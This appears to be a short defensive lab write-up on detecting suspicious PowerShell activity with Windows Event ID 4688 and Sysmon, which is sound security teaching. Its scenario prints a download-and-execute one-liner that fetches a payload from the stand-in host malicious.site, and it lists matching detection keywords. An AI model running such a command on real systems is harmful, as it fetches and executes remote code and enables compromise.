# Case 1 – Suspicious PowerShell Execution Detection

This lab demonstrates how to detect suspicious PowerShell activity using Windows Event Logs and Sysmon.

## Lab Scenario

An attacker executes a malicious PowerShell command that downloads and executes a remote payload.

Example:

powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"

## Detection Sources

- Windows Security Log (Event ID 4688)
- Sysmon Event ID 1 – Process Creation

## Detection Logic

Alert when PowerShell runs with suspicious parameters such as:

- -nop
- -enc
- downloadstring
- IEX

## MITRE ATT&CK

Technique: **T1059.001 – PowerShell**

## Tools Used

- Windows 11
- Sysmon
- Event Viewer

## Detection Rule

This attack can be detected by monitoring **Windows Event ID 4688** and looking for PowerShell execution with suspicious command-line arguments.

## Lab Steps

### Step 1 – Encode PowerShell Command
![Step1](screenshots1.jpg)

### Step 2 – Execute Encoded Command
![Step2](screenshots2.jpg)

### Step 3 – PowerShell Execution
![Step3](screenshots3.jpg)

### Step 4 – PowerShell Execution Details
![Step4](screenshots4.jpg)

### Step 5 – Event 4688 Generated
![Step5](screenshots5.jpg)

### Step 6 – Command Line Details
![Step6](screenshots6.jpg)
